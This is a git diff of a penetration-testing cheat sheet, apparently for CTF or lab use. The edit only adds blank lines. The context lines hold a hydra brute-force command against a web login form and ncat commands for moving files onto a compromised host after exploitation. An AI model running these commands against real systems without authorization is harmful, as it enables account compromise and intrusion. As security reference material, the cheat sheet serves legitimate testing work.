@@ -348,9 +348,12 @@ Web Exploitation
      `hydra -l admin -P /usr/share/wordlists/password/10k <RHOST> http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -t 64`
      
 <br>
+
 Post Exploitation Linux
 ===============================================================================================
+
 <br>
+
 `File Upload`
 
 -    Starting Web Server  
@@ -367,6 +370,7 @@ Post Exploitation Linux
          on target:  ncat -nvlp <port> --ssl > <out-file>
          on kali:  ncat -nv <RHOST> <RPORT> --ssl < <file-to-send>
 <br>
+
 `Enum Tools`
 
 [Linenum](https://github.com/rebootuser/LinEnum)  
